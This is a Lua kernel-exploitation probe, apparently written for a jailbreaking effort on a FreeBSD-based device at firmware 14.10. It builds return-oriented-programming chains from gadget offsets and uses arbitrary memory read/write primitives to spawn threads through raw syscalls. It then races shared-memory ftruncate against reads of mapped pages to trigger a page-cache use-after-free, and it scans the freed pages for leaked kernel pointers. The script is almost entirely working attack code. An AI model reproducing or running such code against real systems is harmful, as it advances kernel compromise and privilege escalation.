-- CRASH_CLASS: MODERATE
-- PROBE 94a: shm ftruncate race - shrink while mapped
--
-- shm_open(482), ftruncate(480), mmap(477) all work on 14.10.
-- If we mmap a large shm object then ftruncate it smaller from a child
-- thread while the main thread reads the now-unmapped pages, the VM
-- system must handle the page fault. If ftruncate doesn't properly
-- invalidate the mapping's pages, we get use-after-free in the page cache.
-- This is the class of bug behind CVE-2026-49427/49428 (largepage variant
-- is dead, but the base-page path may differ).

print("=== PROBE 94a: SHM FTRUNCATE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local prc_lo, prc_hi = eoff(0xE64)
local pr8_lo, pr8_hi = eoff(0x991)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)

local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x1000)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 0xFF8, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)
    for _, c in ipairs(calls) do
        if #c >= 2 then put(pdr_lo, pdr_hi); local l,h = split(c[2]); put(l, h) end
        if #c >= 3 then put(psr_lo, psr_hi); local l,h = split(c[3]); put(l, h) end
        if #c >= 4 then put(prdx_lo, prdx_hi); local l,h = split(c[4]); put(l, h) end
        if #c >= 5 then put(prc_lo, prc_hi); local l,h = split(c[5]); put(l, h) end
        if #c >= 6 then put(pr8_lo, pr8_hi); local l,h = split(c[6]); put(l, h) end
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end
    put(par_lo, par_hi); put(0xD09E94A0, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)
    local par = memory.alloc(0x40); local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb)); wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

local function wait_done(done, ms)
    for w = 1, ms * 10 do if (rd(N(done)) or 0) ~= 0 then return true end end
    return false
end

print("setup done")

-- Step 1: Test basic shm_open + ftruncate + mmap flow
-- SHM_ANON = 1, O_RDWR = 2, O_CREAT = 0x200
print("--- Phase 1: basic shm test ---")
local shm_fd = -1
do
    local ok, rv = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))  -- SHM_ANON, O_RDWR, 0777
    end)
    shm_fd = ok and N(rv) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end
    print("shm_open=" .. shm_fd)
end

if shm_fd >= 0 then
    -- ftruncate to 64KB (4 pages on 16KB page system)
    local ok_t, rv_t = pcall(function()
        return mk(480)(uint64(shm_fd), uint64(0x10000))
    end)
    local t_ret = ok_t and N(rv_t) or -1
    if t_ret >= 0x80000000 then t_ret = t_ret - 0x100000000 end
    print("ftruncate(64K)=" .. t_ret)

    -- mmap the shm
    local ok_m, rv_m = pcall(function()
        return mk(477)(uint64(0), uint64(0x10000), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
    end)
    local map_addr = ok_m and rv_m or nil
    local map_lo, map_hi = split(map_addr)
    print(string.format("mmap=0x%X%08X", map_hi, map_lo))

    if map_addr and map_hi < 0xFFFF then
        -- Write a pattern to the mapped region
        for p = 0, 3 do
            local ok_w = pcall(function()
                memory.write_dword(uint64(string.format("0x%X%08X", map_hi, map_lo + p * 0x4000)), 0xCAFE0000 + p)
            end)
            print(string.format("  page%d write=%s", p, tostring(ok_w)))
        end

        -- Read back
        for p = 0, 3 do
            local ok_r, val = pcall(function()
                return memory.read_dword(uint64(string.format("0x%X%08X", map_hi, map_lo + p * 0x4000)))
            end)
            local v = ok_r and N(val) or -1
            print(string.format("  page%d read=0x%08X", p, v))
        end

        -- Now the race: ftruncate to 16KB (1 page) from child while main reads page 2-3
        print("")
        print("--- Phase 2: ftruncate race ---")
        local anomalies = 0

        for iter = 1, 10 do
            if not alive() then print("DEAD iter=" .. iter); break end

            -- Re-extend to 64KB
            pcall(function() mk(480)(uint64(shm_fd), uint64(0x10000)) end)

            -- Write markers to all pages
            for p = 0, 3 do
                pcall(function()
                    memory.write_dword(uint64(string.format("0x%X%08X", map_hi, map_lo + p * 0x4000)), 0xAABB0000 + iter * 16 + p)
                end)
            end

            local done = memory.alloc(8); wd(N(done), 0)

            -- Child: ftruncate to 16KB (shrink, invalidates pages 1-3)
            local ok_c = spawn_child({{480, shm_fd, 0x4000}}, N(done))
            if not ok_c then print("NOSPAWN " .. iter); break end

            -- Main: immediately try to read pages 2 and 3 (should be gone after truncate)
            for attempt = 1, 5 do
                for p = 2, 3 do
                    local addr_str = string.format("0x%X%08X", map_hi, map_lo + p * 0x4000)
                    local ok_r, val = pcall(function()
                        return memory.read_dword(uint64(addr_str))
                    end)
                    if ok_r then
                        local v = N(val)
                        if v < 0 then v = v + 0x100000000 end
                        -- If we read something other than our marker or zero, interesting
                        local expected = 0xAABB0000 + iter * 16 + p
                        if expected < 0 then expected = expected + 0x100000000 end
                        if v ~= expected and v ~= 0 then
                            print(string.format("  %d_%d p%d: 0x%08X (expected 0x%08X)", iter, attempt, p, v, expected))
                            anomalies = anomalies + 1
                            -- Check adjacent for kernel pointers
                            for off = 0, 28, 4 do
                                local ok2, v2 = pcall(function()
                                    return memory.read_qword(uint64(string.format("0x%X%08X", map_hi, map_lo + p * 0x4000 + off)))
                                end)
                                if ok2 then
                                    local lo2, hi2 = split(v2)
                                    if hi2 >= 0xFFFF8000 and hi2 < 0xFFFFFF00 then
                                        print(string.format("  KPTR +%02X: 0x%08X%08X", p*0x4000+off, hi2, lo2))
                                    end
                                end
                            end
                        end
                    end
                end
            end

            wait_done(done, 5000)

            -- Re-extend for next iteration
            pcall(function() mk(480)(uint64(shm_fd), uint64(0x10000)) end)
        end

        print(string.format("anomalies=%d", anomalies))

        -- Unmap
        pcall(function() mk(73)(uint64(string.format("0x%X%08X", map_hi, map_lo)), uint64(0x10000)) end)
    end

    pcall(function() mk(6)(uint64(shm_fd)) end)
end

print("")
print("alive=" .. tostring(alive()))
print("=== 94a COMPLETE ===")
